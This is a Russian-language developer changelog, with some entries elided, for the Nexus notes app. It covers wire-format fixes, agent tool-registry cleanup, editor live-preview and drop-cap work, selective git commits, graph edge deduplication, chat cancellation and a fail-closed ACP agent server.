Находка авто-гейта мок-паритета (P0-2): `rename_all = "camelCase"` на enum `ChatStreamEvent` переименовывает только ВАРИАНТЫ, не поля struct-вариантов — поле `denied_kind` уходило на провод в snake_case, а фронт ждёт `deniedKind` → в живом app баннер отказа эгресса (offline/feature/host) падал в генерик-рендер, при этом браузер-мок показывал его корректно («зелено врёт» наоборот). Добавлен явный `#[serde(rename = "deniedKind")]` + wire-тест, пинящий ключ (красный без фикса). Единственное многословное поле юниона — остальные ключи не задеты.

### Изменено · B6/B7 — чистка прод-поверхности агента и мёртвых wire-команд (REFACTOR-PLAN §7, решение владельца §8.6)

**Оба пункта ДЕКЛАРИРУЕМО меняют наблюдаемое поведение** (одобрено владельцем): набор инструментов, который видит модель, и wire-API desktop.

- **B7 — debug-стабы вон из прод-реестра агента.** При ВЫКЛ актуаторе (safe-default) `run_agent_session` регистрировал `debug.echo`/`debug.noop` — модель видела пустышки в списке инструментов КАЖДОГО прод-прогона (desktop/agentd/CLI/ACP). Теперь при OFF реестр записи ПУСТ; read-only skills/web добавляются как и раньше НЕЗАВИСИМО от флага. Пустой набор корректен по всему пути: `OpenAiToolProvider::request_body` опускает `tools`/`tool_choice` (тест был), преамбула агента тулы не перечисляет, вызов несуществующего имени → UnknownTool `is_error` (цикл не падает). `stubs.rs` (Echo/Noop) остаётся ТОЛЬКО для юнитов/smoke (agentd `agent_loop_smoke`, live-эвалы регистрируют их явно у себя). Тесты переосмыслены без ослабления: состав реестра при OFF (пусто/ровно skills-тулы) проверяется по спекам, отданным модели; SUB-3-сужение и успешный tool-шаг стрима/персиста доказываются живым read-only `activate_skill` вместо стабов; CLI-лейблы/справка (`OFF (stub)` → `OFF`, «стабы» → «без инструментов записи») обновлены.
- **B6 — мёртвые wire-команды desktop удалены.** `backup_export_json`/`backup_import_json` (W-9 заменил их на `backup_export_to_path`/`backup_import_from_path`) и `memory_fact_history` (MEM-7; панель «истории факта» так и не строилась) — фронт (tauri-api/моки) не вызывал ни одну (grep по `apps/desktop/src` — 0 вызовов): неаудируемая поверхность API вычищена из `invoke_handler`, тела команд удалены. Ядро остаётся: `backup::*` живёт в W-9-путях; `memory::fact_history` — фактически test-only (прод-код консолидации его не вызывает) до появления UI-панели «истории факта»; вернуть мост тривиально.

### Исправлено · P0-1 — фикс-срез аудит-багов (B13/B4/B2/B12/B9/B10)

Первый срез REFACTOR-PLAN (§2 P0-1 + решения владельца §8): минимальные точечные правки, каждая с тестом.

- **B13 (cli):** маппинг исхода прогона `nexus agent` не имел арма `Paused` — пауза врала «бюджет исчерпан (Paused)». Вынесен в `outcome_to_finish` (локальная копия семантики эталона `connect::handler`; НЕ дедуп — это R-2) с честным «прогон приостановлен»; статус остаётся терминальным `error`, как в эталоне. +2 юнита.
- **B4 (граф агента):** kind `fs.read` есть в ACT (`describeStep`), но отсутствовал в `KIND_TABLE` → узел графа падал в 'think'. Добавлена строка `'fs.read' → 'read'` + тесты classifyKind.
- **B2 (ui-стор):** `toggleChat` не знал 5 блокирующих панелей (`goals/memory/episodes/digest/contradictions`) — тоггл закрывал чат, скрытый под ними, вместо возврата в поле зрения. Blocked-набор теперь выводится из ключей `SWITCH_MAIN` (что ветка гасит — то и проверяет; заодно palette/cheatsheet — симметрия с `openChat`). Архитектура булей не тронута (F-4). +6 тестов.
- **B12 (news):** сбой LLM-оценки передавался фронту русской строкой-протоколом в `errors[]` (FE сниффил префикс и выковыривал URL регексом). Теперь структурное поле `NewsRun.llm_down {endpoint, partial}` (миграция 027, NULL-совместимо); FE ключуется на поле (i18n RU/EN), legacy-сниффер оставлен deprecated-путём для старых записей (ретенция 30 дней); мок зеркалит поле. Rust +1 roundtrip + ассерты в pipeline-тестах; FE +4 теста.
- **B9 (онбординг/настройки, решение владельца):** предзаполнение эндпоинтов хардкодом владельческого рига `192.168.0.28` убрано — поля пустые + i18n-подсказка с примером (`http://localhost:8080/v1`) под каждым полем; плейсхолдер ACP-SSH-хоста `artanov@…` → `user@host`. Тесты предзаполнения переписаны осознанно.
- **B10 (Castor, решение владельца):** фиктивный селектор моделей (`qwen3:35b/llama3.3/gpt-5`, ни к чему не подключён) убран из меню настроек агента вместе с мёртвым стейтом `model/setModel` и i18n-ключом (оба языка); футер композера больше не показывает выдуманное имя модели. Вернём при INFER-CFG. +1 тест.
...
- **Буквица переживает ремоунт превью (race, P0)**: deps эффекта штамповки `data-dropcap`/`data-cap` были `[body, mastheadActive]` — React ремоунтил DOM (инвалидация `components`-useMemo новой identity колбэк-пропа GroupPane, напр. после async setMtime) и узел-носитель атрибута уничтожался без перештамповки (репро 1/6 циклов). Deps → `[markdownEl, mastheadActive]`: любой ремоунт идёт через пересоздание `markdownEl`, `useLayoutEffect` перештампует до paint. Race-регрессионный тест ПАДАЛ до фикса (mutation-check); стенд: 6/6 циклов (было 1/6).
- **Графем-гард буквицы** (`dropCapLetter`, masthead.ts — единственная функция буквицы, дубль устранён): ПУНКТУАЦИЯ-лид сохраняет буквицу — `^[\p{P}\s]*([\p{L}\p{Nd}])` пропускает кавычки/тире/скобки до первой буквы/цифры («Все…»→'В', диалог `— Привет…`→'П', `«2026»`→'2'; в data-cap уходит одиночный глиф). Лид-СИМВОЛ/эмодзи (`←`, `🚀`) дисквалифицирует абзац — поиск идёт к следующему «обычному». Раньше `← [[00 - Карта проекта]]` получал data-cap='0', а `::first-letter` раздувал стрелку в гигантскую оранжевую буквицу (Рескорринг.md).
- **«Чистые ссылки» действуют и в просмотре/чтении**: reading намеренно рисовал скобки на каждой вики-ссылке (`.wikilink::before/::after`, S2) — против запроса владельца. Превью подписано на преф `wikilinkLivePreview`; ON → `data-clean-links` на корне `.preview`, CSS гасит скобки (вложенные превью эмбедов покрыты — каждый инстанс ставит атрибут сам). OFF → скобки как раньше. i18n RU/EN описания настройки обновлены (редактор И просмотр).
- **Алиас схлопывается сразу после набора** (strict-края LP): раскрытие под курсором теперь СТРОГО внутри `[[…]]` (`<`/`>` вместо `<=`/`>=`) — закрыл `]]` → ссылка мгновенно схлопнулась в лейбл/алиас; набор внутри держит раскрытой; переходы внутрь — через atomic-ranges. Прежние inclusive-тесты осознанно обновлены. ОСОЗНАННОЕ следствие атомарности (Obsidian-like, кодифицировано тестами): Backspace сразу после схлопнутой ссылки удаляет скрытый `]]` парой, Delete перед алиасной — весь скрытый `[[Target|`-блок разом (скрытый синтаксис ведёт себя как один знак).
- **Режим source/preview запоминается + пилюля не уезжает**: новый персист-преф `nexus.editor.noteMode` — последний выбранный режим становится дефолтом для новых панелей/следующего запуска (открытые панели ретроактивно не трогаются — их унаследованный режим фиксируется в `modes` до смены префа; записи схлопнутых групп прунятся в closeTab/moveTab/dropPathsUnder — воскрешённый `g0` не наследует stale-режим). Пилюля `.modeFloat` вынесена из скролл-контейнера в `.editorCol` (не скроллится с контентом; z-index под InlineAIBar).
- **Перф превью**: колбэки GroupPane → MarkdownPreview/Editor (`onOpenLink`/`onToggleTask`/`fetchNotes`) стабилизированы `useCallback` — inline-стрелки (новая identity на каждый рендер: setMtime, scroll-spy) инвалидировали `components`-useMemo и гоняли полный remark/rehype-репарс с ремоунтом DOM на каждый чих (это и был источник race буквицы).
- Тесты: vitest 1310 (+26): race-регрессия (красная до фикса), графем-гард (пунктуация-лиды «кавычка»/«— диалог» сохраняют буквицу; ←/эмодзи/единственный-стрелочный — дисквалификация; цифра-буквица), data-clean-links ON/OFF+реактивность, strict-края (== matchStart/== matchEnd/строго внутри/частичное выделение/шов смежных) + атомарное удаление Backspace/Delete, персист+наследование префа режима, прун modes (воскрешение g0/moveTab), пилюля вне .scroll. Стенд (webkit, vite :1520): race 6/6; owner-notes Kniga/SA-Agent — буквица ✅, Рескорринг — без стрелки; пунктуация-лиды «— Привет…»/«Все счастливые…» — буквица ✅; скобки ON/OFF скриншот-парой; алиас `[[X|Слово]]` → «Слово» сразу после `]]` без ухода курсора; пилюля неподвижна при скролле 600px; режим наследуется после reload.

### Добавлено · Редактор — Live Preview вики-ссылок (чистые ссылки без `[[ ]]`) + тоггл (репорт владельца)

В режиме редактирования (CodeMirror source) вики-ссылка теперь показывается ЧИСТО — без `[[ ]]`-скобок, с именем/алиасом — как в Obsidian Live Preview. Раньше сырой `[[Файл]]` отображался со скобками (только подсветка).

- **CM6 live-preview** (`extensions.ts`): `Decoration.replace` (атомарные) скрывают синтаксис вики-ссылки (`[[`, `Файл|`-префикс, `#заголовок`-суффикс, `]]`), оставляя видимым лейбл — алиас (после `|`) либо имя файла. `[[Файл|Любое имя]]` → «Любое имя». **Под курсором ссылка раскрывается** в полный сырой `[[…]]` (правка), `atomicRanges` не дают курсору застрять в скрытом. Чистая `buildLivePreviewRanges` (тестируема). Документ НЕ меняется (дисплей-декорация); клик-навигация + автокомплит `[[…` работают по сырому тексту. Эмбеды `![[…]]` пропущены.
- **Тоггл** Настройки → Редактор → «Чистые ссылки (Live Preview)» (`prefs.ts` `wikilinkLivePreview`, дефолт ВКЛ, persist localStorage); реактивность через CM6-`Compartment` + reconfigure (без пересоздания view).
- Тесты (+vitest 1274): скрытие/алиас/курсор-раскрытие/флаг-OFF/тоггл-persist/Settings-строка. Флаг OFF → поведение как раньше.

### Улучшено · Редактор — буквица на ПЕРВОМ обычном абзаце (репорт владельца)

Обобщение прошлого фикса: буквица (большая акцентная первая буква/цифра) теперь ставится на первый «обычный» абзац тела в порядке чтения — где бы он ни был (проза-first, внутри H2-секции, после списка/callout). Раньше смотрелся только первый контент-блок. «Обычный» = НЕ внутри masthead/properties, callout, цитаты, списка, таблицы, figure. Скоуп на свой документ (не штампует абзац вложенного эмбеда). +7 тестов (1258). Diff-ревью (малая чистая генерализация, инварианты прошлого adversarial сохранены).

### Исправлено · Редактор «Редакция» — эмодзи в заголовках + буквица «не всегда появлялась» (репорт владельца)

Два бага живого дизайна Hermes-8 (пример — daily-заметка, открывающаяся `## 🧠 …`). Все правки — display/render-трансформы; исходные `.md` НЕ мутируются.

- **Эмодзи из заголовков убраны** в режиме чтения (редакционный Cormorant): шаблонные `📅`/`🧠`/`💡` больше не рендерятся в masthead-заголовке, H2-секциях/H3–H6 и оглавлении. Новый remark-плагин `remarkStripHeadingEmoji` (до `remarkNexus` — `[[вики]]`/`#теги` в заголовке целы) + strip в masthead/outline. Регекс сужен до настоящих эмодзи (supplementary-планы U+1F000+ / VS-16-последовательности / флаги) — текстовые знаки **™ © ® ℹ ↗ ✔ ⚙** в заголовках СОХРАНЯЮТСЯ. Удаление эмодзи поузельно (без trim границ) → заголовки с `**bold**`/`` `code` ``/вики НЕ склеивают слова.
- **Буквица (большая акцентная первая буква/цифра) теперь появляется**, когда заметка открывается H2-секцией. Причина «не всегда»: после фичи сворачиваемых секций (S3) первый абзац вложен в `<section>`, а логика буквицы смотрела только прямых детей `.preview`. Теперь спускается в первую секцию к её лид-абзацу (пропуская абзацы внутри callout/цитаты). Также буквица поддерживает ведущую ЦИФРУ (раньше только букву).
- Тесты vitest +12 (всего 1251): эмодзи срезаны/текст-знаки целы/слова не склеены/буквица в секции/цифра/callout-blockquote-пропуск/source byte-identical. Независимый adversarial-ревью (2 линзы) поймал CRITICAL (склейка слов в заголовках с inline-марками — гейт был зелёным, тест кодифицировал баг) + 2 MAJOR (strip ™©®; буквица в callout) — все исправлены.

### Добавлено · Настройки (P1-16, P1-17) — достижимые из UI consent-новостей и отзыв git-токена

Два аудит-минора «фича недостижима из UI» (бэкенд уже был).

- **P1-17** — нельзя было отозвать сохранённый git-токен (`git.clearToken` есть, кнопки не было). Добавлена «Отозвать токен» в `SyncPanel` (видна когда токен подключён) → реальный `git_clear_token` → индикатор «нет токена». Ошибка не глотается (B16).
- **P1-16** — news-consent (`enabled`, эгресс-согласие на сбор новостей) переключался ТОЛЬКО из ленты (consent-CTA). Добавлен Off/On-тоггл в `NewsSettingsSection` — **тот же** `setConfig`-механизм, что у CTA ленты (не новый egress-обход); merge сохраняет sources/extraHosts/keywords/modelPref (тест ассертит). Вторая точка доступа, юзер-контролируемый consent.
- Тесты: P1-17 (connected→кнопка→clearToken+connected false / нет токена→нет кнопки), P1-16 (тоггл отражает/меняет enabled, поля целы). Гейт зелёный (vitest 1219). S-фиксы, ревью диффом (P1-16 эгресс-consent сверен — честный механизм CTA).
...
- **P1-15 (honesty/UX):** кнопка «Сократить» в ридере была активна даже без тела статьи (article не `ready`) → клик давал пустой summary/ошибку. Теперь `disabled={thinking || !ready}` + title-подсказка «статья ещё не загружена». +2 теста (disabled без тела / enabled когда ready; happy-path цел).
- Гейт зелёный (vitest 1202). Бэкенд не тронут (контракт уже верный).

### Исправлено · Тесты — устранён флейк `Onboarding.test.tsx` (ai.fast)

Тест «существующий ai.fast сохраняется» кликал «Сохранить» сразу после навигации на шаг AI, не дождавшись async `getAiConfig` (который грузит `fast` в стейт) → гонка: иногда `setAiConfig` звался без `fast` и `waitFor` на него таймаутил (тест мигал на CI/гейте). Добавлен гард `await screen.findByDisplayValue('http://h:8080')` ДО клика — ждёт префила конфига (как уже сделано в соседнем тесте «конфиг с моделью НЕ затирается»). Стабильность подтверждена 5× `--sequence.shuffle`.

### Добавлено · Sync — выборочный коммит из UI (P1-5/6)

Аудит-баг (over-reporting + мок≠бэк). Бэкенд `git_commit_paths` (выборочный коммит) существовал, но `SyncPanel` коммитил только всё-или-ничего (нет выбора файлов) → фича недостижима; а мок `commitPaths` чистил ВЕСЬ dirty игнорируя выбор (превью/тесты врали).

- **`SyncPanel.tsx`**: чекбоксы на каждом изменённом файле + master «выбрать всё/ничего». `commit()` маршрутизирует: всё выбрано → `git.commit` (дефолт, не регресс); подмножество → `git.commitPaths(выбранные)`. Кнопка disabled при пустом выборе; лейбл «Коммит выбранных · N» на подмножестве. После частичного коммита невыбранные файлы остаются в списке.
- **`mock/git.ts`**: честный `commitPaths` — зеркалит бэкенд `commit_paths_with_message`: коммитит ТОЛЬКО пересечение `paths`∩`dirty`, остальное остаётся dirty; пустое/устаревшее пересечение → `nothing-to-commit`. `commit` (all) теперь тоже honor пользовательского сообщения (зеркало `commit_all_with_message`). `tauri-api.ts` проводка обоих.
- Тесты: +8 мок (`commitPaths` оставляет невыбранное, nothing-to-commit, all) +6 SyncPanel (подмножество→commitPaths, дефолт-все→commit, пустой→disabled, изоляция). Test-isolation: `__resetGitMock()` в `beforeEach` (общий мок-стейт `dirty` сбрасывается) → order-independence подтверждена 5× `--sequence.shuffle`. Гейт зелёный (vitest 1197). Независимый adversarial-ревью (2 линзы) → 0 major (мок↔бэк контракт + роутинг чисты) + 1 minor (тест-изоляция) исправлен.

### Удалено · Осиротевший `RelatedView` (P3-1, легаси)

Аудит-долг. Компонент `RelatedView` (`components/chat/RelatedView.{tsx,test.tsx,module.css}`) больше нигде не импортировался — его функционал («похожие заметки») переехал в `InspectorRail`/`RelatedNotes`. Подтверждено grep'ом (внешних ссылок 0) + гейт зелёный после удаления (нет висячих импортов). Удалены 3 файла.
...
### Исправлено · Граф (P1-19) — реципрокные рёбра больше не двоят степень/размер/счётчик

Аудит-баг (data-correctness + мок≠бэк). Граф ненаправленный (линии без стрелок), но в данных взаимная пара ссылок A↔B давала ДВА направленных ребра (A→B и B→A). `GraphView` считает степень инкрементом обоих концов на каждое ребро → реципрокная пара раздувала степень/размер узла, счётчик рёбер и рисовала двойную линию.

- **`graph/mod.rs`**: helper `dedup_undirected_edges` схлопывает рёбра в канонические ненаправленные пары `(min,max)` через `HashSet` — применён в ОБОИХ местах сбора (`get_local_graph` + `get_full_graph`), сохраняя фильтры self-loop и `target ∈ узлы`. Степень/счётчик/рендер чинятся одним местом (фронт-цикл не трогали — он корректен на дедуп-данных).
- **TOP-N отбор хабов** (`get_full_graph`, усечённый вид большого vault): degree-ранг переписан на НЕНАПРАВЛЕННУЮ степень (канонический pair-view в одном CTE → один скан `links`, проверено `EXPLAIN QUERY PLAN`) — раньше реципрокные хабы несправедливо выигрывали отбор.
- **Мок** `mock/vault.ts::edgesAmong` уже дедуплицировал ненаправленно (контракт мок↔бэк сходится) — добавлен мок-тест.
- Тесты: +2 Rust (реципрокная пара → одно ребро в обоих местах; TOP-N ранг по ненаправленной степени) +1 мок. Гейт зелёный (`nexus-core` 1088 · clippy/fmt 0 · vitest 1188). Независимый adversarial-ревью (2 линзы) → ядро чисто (Louvain не задет — фронт сам реканонизирует; рёбра/узлы не теряются) + 1 minor (перф-регресс двойного скана от no-tails-доделки) исправлен (CTE, один скан).

### Исправлено · Чат (P1-7) — Stop теперь отменяет фазу ретрива (web · rerank · recall)

Аудит-баг (гонка). Раньше токен отмены (`state.begin_chat()`) создавался уже ПОСЛЕ ретрива → клик Stop во время «ищет/думает» не прерывал ничего: дорогие web-поиск и LLM-реранк догорали впустую, и только стрим-фаза реагировала на отмену.

- `commands/chat.rs`: `begin_chat()` (+ `enter_interactive_llm`-гард) поднят в НАЧАЛО команды — один токен на весь прогон (дубль перед стримом удалён, иначе он затирал бы взведённый Stop). Добавлены 5 межфазных чек-точек (`bail_if_cancelled!()` → helper `retrieval_cancelled`): ранний выход = исход отмены (`Done{full:""}`, НЕ `Error`). Пользовательский `cancel` протянут в `search::rerank::llm_rerank` и web `agent::run` (вместо локальных заглушек) → Stop кооперативно прерывает самую долгую LLM-фазу.
- `stores/chat.ts`: гард `save()` расширен — пустой/отменённый обмен (`Done` без токенов, но источники уже пришли) больше НЕ персистится (раньше писался «источники без ответа» в `chat_messages` + пустая ассистент-реплика индексировалась в память переписки N4b). Чинит и серверную (egress-offline), и пользовательскую отмену.
- Тесты: +4 Rust (`chat.rs`: один-токен-на-прогон, ранний-выход-Done-не-Error, дорогие-фазы-не-вызваны; `rerank.rs`: взведённый cancel → фолбэк на гибрид-порядок) +3 vitest (пустой/whitespace-обмен не персистится, позитив-контроль). Гейт зелёный (cargo desktop 228 · core 1088 · vitest 1187). Независимый adversarial-ревью (2 линзы) → 0 major на ядре + 1 minor (пустой персист) исправлен.

### Дизайн · Hermes-8 S6b «Редакция» — рескин инспектора (бэклинки · похожие · упоминания)

Завершает визуальный рескин инспектор-рейла (S6 сделал оглавление). Все на РЕАЛЬНЫХ данных.

- **Бэклинки** (`BacklinksBar`) — карточный вид (paper-фон, рамка 9px, hover→border-strong, Cormorant-заголовок), счётчик-пилюля; **похожие** (`RelatedNotes`) — карты §6 (Cormorant 15px, лид с искрой, реальный score `toFixed(2)` справа); **упоминания** (`MentionsBar`) — тот же card-вид с `dashed`-рамкой (признак «связи ещё нет»); активный пункт rail — ember-маркер.
- **Честность (анти-фейк):** score — это настоящая cosine-similarity `1−cosine_distance` (usearch Cos, 0–1), не относительный сорт-скор (заменил вводящий-в-заблуждение `%`-формат). **НЕ добавлены** фейк-кнопки «Вставить ссылку»/«+ связать» (нет реального insert-wikilink/link-write backend → deferred; карты кликабельны = открыть заметку, реальное действие). `em`-подсветка совпадения НЕ выдумана (бэкенд-контекст — простой текст без маркеров). Лид честен к данным (близкие заметки, включая уже связанные). Компоненты НЕ слиты (4 раздельных файла).
- **adversarial FIX:** grid-карты получили `min-width:0` (+ `overflow-wrap:anywhere` на заголовке) — иначе nowrap-контекст без пробелов (путь/URL/CJK) распирал бы трек и ломал ellipsis (класс grid-overflow #144).
- Только семантические токены (13 тем), все интеракции/a11y/refresh целы. Тесты vitest (1184). Независимый adversarial-ревью (2 линзы) → 0 честностных проблем + 1 minor (min-width) исправлен.
...
- **Новый `Popcard`** (`Popcard.tsx`/`.module.css`) — `position:fixed; z-index:60; width:300` (сноска `.fnote` — 280), paper-фон, `border-strong`, `radius:11px`, тень `--elevation-2`, появление `.show` (opacity 0→1, translateY 4→0, .15s; `prefers-reduced-motion` обнуляет). Позиционирование `place()` от `getBoundingClientRect()` триггера: под элементом (`bottom+8`), кламп по краям + флип вверх + финальный кламп низа (длинная карточка не уходит за вьюпорт; `max-height:calc(100vh-16px); overflow:hidden`). `pointer-events:none` — не перехватывает клик по ссылке.
- **Ховер вики-ссылки (220мс)** → РЕАЛЬНОЕ превью целевой заметки: резолв тем же продакшн-резолвером, что у живой навигации (`vault.resolveNote`→`resolve_note` → `vault.readFile`), eyebrow=тип (frontmatter), title=`title`/H1/basename, body=эксцерпт тела (frontmatter/ведущий H1/markdown срезаны; **незакрытый код-фенс глушится** — без утечки сырого тела/секретов), meta=статус + N ссылок из РЕАЛЬНЫХ беклинков (`graph.getBacklinks`). Анти-фейк: битая ссылка (`resolve_note`→null) → честное «Заметка не найдена» (muted); найденная-но-пустая → «Пустая заметка» (не «не найдена»); счётчик опускается, если беклинков нет/источник недоступен. Клик → живая навигация `onOpenLink` как раньше.
- **Ховер сноски (120мс)** → `.popcard.fnote` с текстом сноски из её `<li id=…fn-N>` (GFM-блок сносок). Резолв `<li>` скоупится на ВЛАДЕЮЩУЮ `.preview` инстанса (`previewRef`) + фильтр по ближайшему `.preview`-предку — сноска из вложенного эмбеда (тот же `fn-1`) НЕ перепутывается (тот же скоуп применён и к клик-скроллу сноски).
- **Жизненный цикл:** один pending-таймер + монотонный request-токен против гонок async-чтения (ушли/сменили цель → ответ не показывается); cleanup на смене `body`/заметки и unmount; страховочный `mouseleave` на стабильном `.preview` (надёжное скрытие при ремонте поддерева ReactMarkdown).
- Чистый CSS + хелперы `lib/editor/popcard.ts` (изолированные unit-тесты). Тесты vitest (+31 к срезу: показ/тайминги/анти-фейк/эмбед-скоуп/утечка-фенса/пустая-заметка). Гейт зелёный. Adversarial-ревью (3 линзы) → 2 MAJOR (cross-embed сноска, утечка незакрытого фенса) + 3 minor исправлены.
...
- **Ядро** (`crates/nexus-core/src/agent/connect/acp/server.rs`): `serve_acp(transport, AcpServerConfig)` — read-loop + реестр сессий (ОДНА сессия/коннект R1; мультитёрн с историей cap 16, только успешные ходы; ОДИН активный ход R2) + СПАВНЕННАЯ per-prompt drive-задача (create_run → `run_agent_session` → finish_run; задача сама отвечает на prompt-id ПОСЛЕ стрима+permission → read-loop не блокируется, cancel/Response текут конкурентно). `AcpServerDecisionSource` (impl `actuator::DecisionSource`) — ЕДИНСТВЕННОЕ место записи: шлёт `session/request_permission` клиенту, ждёт ответ (oneshot + 5-мин таймаут); **fail-closed reject_all** на КАЖДОМ рубеже (send-fail/timeout/EOF/cancel/Cancelled/неизвестная опция/parse-miss); пер-батч (один Allow = весь батч). Чистые фн `map_event_to_acp` (исчерпывающий match + `_`), `proposal_to_permission_params`, `outcome_to_batch_decision`, `stopreason_from_outcome`. `StdinStdoutTransport` (tokio stdin/stdout через общий `framing`; tokio-фича `io-std`). **Весь outbound — через `serde_json::json!`** (юнионы с `#[serde(other)]` несериализуемы).
- **schema.rs**: добавлен `Deserialize` к 3 ВХОДЯЩИМ param-типам (NewSessionParams/PromptParams/CancelParams) — сервер их парсит. Outbound-типы не тронуты. Контракт-тест расширен входящим парсом.
- **CLI** (`crates/nexus-cli/src/acp.rs` + `main.rs` арм `["acp", …]`): `nexus acp --vault P [--actuator] [--auto]` — переиспользует shared `build_deps` (та же композиция vault/DB/egress/provider, что `nexus agent`). Default: actuator **OFF** (стабы, vault не трогается), автономия **confirm** (каждая правка → permission клиенту), permission **fail-closed**. `--auto` авто-применяет лишь Auto-тир; Confirm-тир (риск) всё равно ждёт явного allow. **НЕТ `--yes`/ApproveAll по ACP** (клиент — единственный аппрувер). client-`cwd`/`mcpServers` игнорятся (vault фиксирован `--vault`, R7). Всё логирование → stderr (stdout — канал протокола).
- **Безопасность**: запись требует (--actuator) И (write-инструменты в реестре) И (classify-тир) И (явный selected+allow от клиента) — снять любое = fail-closed. memory/skills/web/delegation/research выключены (slice-1). Honest R1–R9 в спеке.
- **Тесты**: 26 юнитов server.rs (стрим/permission-матрица/R1/R2/мультитёрн/cancel/auto/eof/oversize + чистые фн) на `channel_pair`+FakeProvider (без LLM); 3 CLI-юнита (флаги/дефолтная поза); model-free E2E (`tests/acp_server_e2e.rs`, unix) — наш `AcpClient` драйвит РЕАЛЬНЫЙ `nexus acp` подпроцесс через `StdioTransport` (initialize→session/new→unknown(-32601)→cancel→drop→чистый выход). Полный prompt-драйв покрыт in-process юнитами → e2e остаётся model-free.
...
- **`ExecList`** (`AgentView.tsx`, в доке «Граф» рядом с деревом субагентов): read-only список `turn.execItems` — силуэт команды (`summary`) + exit-код + finalized-бейдж. Приватность §5.6: только силуэт + exit-код, БЕЗ сырого stdout/argv (как уже редактировано на проводе).
- **Честный скоуп**: exec структурно Linux-only (rootless-Podman sandbox); десктоп на macOS exec-события не порождает → список пуст в норме. Это readiness-to-receive (Linux-сборка / будущий коннектор к agentd). **Кнопки approve НЕТ намеренно** — у десктопа нет exec-decision-пути (решение host-side в песочнице/коннекторе), фейковая кнопка вводила бы в заблуждение.
- Без изменений бэкенда/контракта/стора/настроек (всё было). 3 i18n-ключа (`agent.exec.*`, RU+EN). Adversarial-ревью: **0 critical / 0 major** (нет мёртвого UI, приватность соблюдена, без регрессии GraphDock/W-24). Гейт: typecheck/lint/vitest **978** (+1).

### Агент · W-27 — единый раздел настроек агента + блок «Подключение» 🔴 BETA

Настройки агента стали легче читаться, и видно, к каким LLM-эндпоинтам подключён vault.

- **Блок «Подключение»** (`SettingsView.tsx` → `ConnectionBlock`): постоянный (не dev-only) — показывает chat/embedding/fast эндпоинты (url · model) и их доступность пилюлями ✓/✗/— по кнопке «Перепроверить» (+ авто-проверка при открытии). Переиспользует логику W-21 self-check (`getAiConfig`→`testConnection`, latest-wins-гард). `role="status" aria-live="polite"` (озвучка статуса AT).
- **Группировка**: под-заголовок «Возможности» перед sandbox/shell/web/delegation/research — агент-тогглы читаются как одна секция. **Семантика тогглов НЕ менялась, строки не двигались** (чисто аддитивно: один заголовок + read-only блок здоровья).
- agentd-статус осознанно отложен (нет IPC-клиента к демону — это была бы новая security-поверхность; блок «Подключение» покрывает actionable-сигнал — здоровье LLM).
- Adversarial-ревью: **0 critical / 0 major** (тогглы/coherence не тронуты, faithful SelfCheck-reuse, i18n RU+EN паритет). Гейт: typecheck/lint/vitest **977** (+2).
...
- **REPL** (`crates/nexus-cli/src/agent.rs`): задачи вводятся построчно, **история переписки** держится между ходами (мультитёрн, кап 16 сообщений, только успешные ходы). `Deps` (БД/провайдер) строятся один раз и переиспользуются.
- **Slash-команды**: `/help`, `/quit` (или Ctrl-D), `/new` (очистить историю), `/auto` (переключить confirm↔auto), `/actuator` (вкл/выкл живые правки), `/undo` (откатить последний прогон через `actuator::undo_run`). `/pause` намеренно опущен (kill-switch мид-рана не имеет смысла в построчном REPL — честно отмечено в `/help`).
- Рефактор: общий `run_turn` (create_run→сессия→finish_run) переиспользуется one-shot (W-28/29) и REPL; one-shot поведение сохранено без регрессии.
- Adversarial-ревью (correctness + safety, 2 линзы): correctness **0/0** (рефактор верный, регрессии нет); safety нашёл **1 honesty-дефект** (старт с `--yes` молча переносился в `/actuator`-тоггл, чьё сообщение лживо обещало `[y/N]`) — **исправлено**: баннер раскрывает взведённый `--yes`, сообщение `/actuator` честно отражает авто-одобрение. Гейт: build/clippy(workspace)/fmt + 12 юнит-тестов (+ `parse_slash`).
...
- **frontend** (`agent/AgentView.tsx`): `proposedContentByPath` извлекает предложенный контент из tool-вызовов хода (`note.create`/`note.edit` несут `{path, content}` — ключи подтверждены по `tools.rs`); по клику-тогглу читает текущий файл (`vault.readFile`, новый → пусто) и рендерит `lineDiff` (add/del/same). FE-only: контракт/леджер НЕ тронуты — приватность AGENT-6 (леджер без контента) цела; дифф строится из транзиентного event-стрима + чтения файла самим владельцем.
- **mock** дополнен `note.create`-вызовом (mock-must-match-backend: предложения рождаются из note-tool-вызовов).
- Adversarial-ревью (3 измерения × verify, 9 находок / 3 подтверждено — все исправлены: новый файл → чистый add-дифф без ложной пустой `del`-строки; `diffEmpty` теперь достижим (all-same); `.cfBlock`-обёртка не ломает разделители строк). Гейт: typecheck / eslint / vitest 968 (AgentView +1 тест).

### Агент · W-14 — живой план (реальные шаги вместо демо-заглушки) 🔴 BETA

Правый dock «План» агента был статичной демо-структурой (ST-G6: фейковые шаги вроде `match.projects`). Теперь — РЕАЛЬНЫЕ шаги прогона.

- **frontend** (`agent/AgentView.tsx`): `PlanLive` вместо `PlanDemo` — план = tool-вызовы последнего хода из стора (`result==null` → выполняется, `isError` → ошибка, иначе → готово); прогресс-бар = доля завершённых; честный пустой стейт, когда ход без действий (только чат). Убрана демо-заглушка + мёртвый i18n-ключ `plan.demoNote` + мёртвый CSS (`piPend`/`planDot`).
- dock «Граф выполнения» ОСТАЁТСЯ демо (research-режим) — контракт UI-1a не несёт graph-данных; отложено в BACKLOG.
- Adversarial-ревью (3 измерения × verify, 6 находок / 1 подтверждено — мёртвый CSS, вычищен). Гейт: typecheck / eslint / vitest 967 (AgentView +2 теста).
...
- **binding** (`tauri-api.ts` + мок): `chat.sessions.search(query, limit)` → `ChatSearchHit` (sessionId/title/role/snippet/createdAt/summary). Мок — подстрочный поиск со snippet.
- **UI** (`chat/AiPanel.tsx` SessionHistory): инпут поиска (дебаунс 220мс), результаты со snippet — клик грузит сессию. Пустая история по бакетам, когда запрос пуст.
- Adversarial-ревью (3 измерения × verify, 8 находок / 2 подтверждено — оба исправлены: snippet-маркеры `[..]` → `<mark>`-подсветка (CSP-safe split); «Совпадений нет» показываем только ПОСЛЕ завершения поиска, не на каждый ввод). Гейт: typecheck / eslint / vitest 962 (AiPanel +2 теста).

### Онбординг · W-7 — шаг настройки AI (ввод эндпоинтов + проверка связи) 🔴 BETA

